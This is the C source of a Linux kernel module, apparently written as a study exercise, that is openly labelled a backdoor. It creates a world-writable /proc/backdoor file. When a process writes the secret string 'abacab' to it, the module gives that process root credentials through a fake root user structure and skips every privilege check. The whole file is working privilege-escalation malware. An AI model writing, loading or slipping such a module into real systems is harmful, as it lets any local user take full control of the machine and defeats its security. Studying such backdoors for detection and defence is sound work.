#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/security.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Anna Piatkova");
MODULE_DESCRIPTION("Backdoor: a file in procfs writing a certain string to which sets the uid of the calling process to 0 without checking any of its privileges");
MODULE_VERSION("0.1");

#define FILENAME "backdoor"
#define SECRET "abacab\n"
#define LEN_SECRET strlen(SECRET)

static char tmp[LEN_SECRET + 1];

/* Fake root user */
struct user_struct root_user = {
	.__count	= REFCOUNT_INIT(2),
	.uid		= GLOBAL_ROOT_UID,
	.ratelimit	= RATELIMIT_STATE_INIT(root_user.ratelimit, 0, 0),
};

static int set_user(struct cred *new)
{
	free_uid(new->user);
	/*
	* Set the number of references on our fake root to 2 so that
	* free_uid never makes it 0 and free_user never gets called on it
	*/
	atomic_set(&root_user.__count.refs, 2);
	new->user = &root_user;
	return 0;
}

static long setuid_no_checks(void)
{
	struct user_namespace *ns = current_user_ns();
	const struct cred *old;
	struct cred *new;
	int retval;
	kuid_t kuid;

	kuid = make_kuid(ns, 0);
	if (!uid_valid(kuid))
		return -EINVAL;

	new = prepare_creds();
	if (!new)
		return -ENOMEM;
	old = current_cred();

	new->suid = new->uid = kuid;
	if (!uid_eq(kuid, old->uid)) {
		retval = set_user(new);
		if (retval < 0)
			goto error;
	}

	new->fsuid = new->euid = kuid;

	return commit_creds(new);

error:
	abort_creds(new);
	return retval;
}

static ssize_t proc_backdoor_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
{
	if (len != LEN_SECRET) {
		pr_info("backdoor: wrong length: %ld != %ld\n", len, LEN_SECRET);
		return len;
	}
	int ret;
	if ((ret = copy_from_user(&tmp, buf, LEN_SECRET))) {
		pr_info("backdoor: copy from user failed, ret = %d\n", ret);
		return len;
	}
	tmp[LEN_SECRET] = '\0';
	if (strcmp(tmp, SECRET)) {
		pr_info("backdoor: wrong string\n");
		return len;
	}
	pr_info("backdoor: success, setting uid to 0\n");
	setuid_no_checks();
	return len;
}

const struct proc_ops backdoor_ops = {
	.proc_write = proc_backdoor_write,
};

static int __init backdoor_init(void)
{
	struct proc_dir_entry *entry = NULL;
	entry = proc_create_data(FILENAME, 0666, 0, &backdoor_ops, 0);
	pr_info("backdoor: module loaded\n");
	return 0;
}

static void __exit backdoor_remove(void)
{
	
	remove_proc_entry(FILENAME, 0);
	pr_info("backdoor: module unloaded\n");
}

module_init(backdoor_init);
module_exit(backdoor_remove);
